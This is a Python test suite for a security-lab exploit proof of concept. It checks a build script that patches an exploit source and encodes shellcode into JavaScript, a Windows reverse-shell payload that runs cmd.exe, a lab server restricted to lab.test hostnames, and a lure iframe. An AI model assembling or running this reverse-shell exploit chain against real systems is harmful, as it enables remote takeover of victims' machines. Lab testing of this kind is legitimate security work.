from __future__ import annotations

import sys
import unittest
from pathlib import Path


SCRIPTS = Path(__file__).resolve().parents[1] / "scripts"
sys.path.insert(0, str(SCRIPTS))

import lab_http_server
import build as build_script
import prepare_runtime
import reverse_shell


class FakeConnection:
    def __init__(self, responses: list[bytes | BaseException]) -> None:
        self.responses = iter(responses)

    def recv(self, _size: int) -> bytes:
        response = next(self.responses)
        if isinstance(response, BaseException):
            raise response
        return response


class EmbeddedBuildTests(unittest.TestCase):
    def test_mingw_sdkddkver_compatibility_header_exists(self) -> None:
        poc_root = Path(__file__).resolve().parents[1]
        header = poc_root / build_script.COMPAT_INCLUDE / "SDKDDKVer.h"
        self.assertTrue(header.is_file())
        self.assertIn("#include <sdkddkver.h>", header.read_text(encoding="utf-8"))

    def test_replaces_unique_upstream_command(self) -> None:
        source = (
            f"{build_script.INCLUDE_ANCHOR}\n"
            f"{build_script.KERNEL_CALLBACK_ANCHOR}"
            "void exploit() {\n"
            f"    {build_script.ORIGINAL_COMMAND}\n"
            "}\n"
        )
        patched = build_script.patch_upstream_source(source)

        self.assertIn(build_script.PAYLOAD_DECLARATION, patched)
        self.assertIn(build_script.SAFE_KERNEL_CALLBACK, patched)
        self.assertIn(build_script.EMBEDDED_COMMAND, patched)
        self.assertNotIn(build_script.ORIGINAL_COMMAND, patched)

    def test_rejects_duplicate_upstream_commands(self) -> None:
        source = (
            f"{build_script.INCLUDE_ANCHOR}\n"
            f"{build_script.KERNEL_CALLBACK_ANCHOR}"
            f"{build_script.ORIGINAL_COMMAND}\n"
            f"{build_script.ORIGINAL_COMMAND}\n"
        )
        with self.assertRaisesRegex(ValueError, "expected one"):
            build_script.patch_upstream_source(source)

    def test_rejects_missing_kernel_callback_anchor(self) -> None:
        source = (
            f"{build_script.INCLUDE_ANCHOR}\n"
            f"{build_script.ORIGINAL_COMMAND}\n"
        )
        with self.assertRaisesRegex(ValueError, "kernel callback anchor"):
            build_script.patch_upstream_source(source)

    def test_rejects_duplicate_kernel_callback_anchors(self) -> None:
        source = (
            f"{build_script.INCLUDE_ANCHOR}\n"
            f"{build_script.KERNEL_CALLBACK_ANCHOR}"
            f"{build_script.KERNEL_CALLBACK_ANCHOR}"
            f"{build_script.ORIGINAL_COMMAND}\n"
        )
        with self.assertRaisesRegex(ValueError, "kernel callback anchor"):
            build_script.patch_upstream_source(source)

    def test_javascript_encoding_round_trip_and_padding(self) -> None:
        javascript, padded = build_script.shellcode_javascript(b"\x90ABC")
        self.assertEqual(build_script.decode_words(javascript), padded)
        self.assertEqual(len(padded) % 2, 0)

    def test_runtime_stages_only_generated_shellcode(self) -> None:
        destinations = prepare_runtime.runtime_destinations(
            Path("upstream"), Path("build"), Path("poc")
        )
        self.assertEqual(
            {path.name for path in destinations},
            {"shellcode.js"},
        )
        self.assertNotIn("p.exe", {path.name for path in destinations.values()})
        self.assertNotIn("exploit.js", {path.name for path in destinations.values()})

    def test_reverse_shell_payload_reports_stages(self) -> None:
        payload = (
            Path(__file__).resolve().parents[1]
            / "payload"
            / "reverse_shell_payload.c"
        ).read_text(encoding="utf-8")
        self.assertIn("CreateProcessA", payload)
        self.assertIn('"stage=connected', payload)
        self.assertIn('"stage=cmd_started', payload)
        self.assertIn("stage=child_ready", payload)
        self.assertIn("cmd.exe /Q /K", payload)
        self.assertIn("CreatePipe", payload)
        self.assertIn("relay_child_output", payload)
        self.assertIn("reverse_shell_worker", payload)
        self.assertIn("CreateThread", payload)
        self.assertIn('"WinSta0\\\\Default"', payload)
        self.assertIn("startup_info.lpDesktop = desktop_name", payload)
        self.assertIn("startup_info.hStdInput = child_stdin_read", payload)
        self.assertNotIn("calc.exe", payload)

    def test_build_uses_only_reverse_shell_payload(self) -> None:
        self.assertEqual(
            build_script.PAYLOAD_SOURCE,
            Path("payload/reverse_shell_payload.c"),
        )


class HttpOriginTests(unittest.TestCase):
    def test_accepts_fixed_lab_hostnames(self) -> None:
        self.assertEqual(lab_http_server.role_for_host("portal.lab.test"), "wrap")
        self.assertEqual(lab_http_server.role_for_host("exp.portal.lab.test"), "exp")

    def test_rejects_unscoped_hostname(self) -> None:
        for host in (
            "example.com",
            "portal.lab.test.evil",
            "wrap-run01.portal.lab.test",
            "exp-run01.portal.lab.test",
        ):
            with self.subTest(host=host):
                self.assertIsNone(lab_http_server.role_for_host(host))

    def test_wrapper_keeps_completed_lab_frame_alive(self) -> None:
        wrapper = (
            Path(__file__).resolve().parents[1] / "host1_wrapper" / "iframe.html"
        ).read_text(encoding="utf-8")
        self.assertIn("Authorized security lab simulation", wrapper)
        self.assertIn("exp.portal.lab.test", wrapper)
        self.assertIn("e.origin !== expectedOrigin", wrapper)
        self.assertIn("이 탭은 닫지 마십시오", wrapper)
        self.assertNotIn("10.10.10.80", wrapper)
        self.assertNotIn("normalPortalFrame", wrapper)
        self.assertNotIn("window.location.replace", wrapper)


class ReverseShellTests(unittest.TestCase):
    def test_reverse_shell_verification_does_not_exit(self) -> None:
        self.assertIn(b"whoami", reverse_shell.VERIFY_COMMANDS)
        self.assertNotIn(b"exit", reverse_shell.VERIFY_COMMANDS)
        self.assertNotIn(b"calc.exe", reverse_shell.VERIFY_COMMANDS)

    def test_reverse_shell_waits_for_ready_stage(self) -> None:
        expected = (
            b"stage=connected\r\n"
            b"stage=cmd_started\r\n"
            b"stage=child_ready\r\n"
        )
        connection = FakeConnection([expected])
        self.assertEqual(
            reverse_shell.receive_until(
                connection,
                (reverse_shell.READY_MARKER,),
            ),
            expected,
        )


if __name__ == "__main__":
    unittest.main()
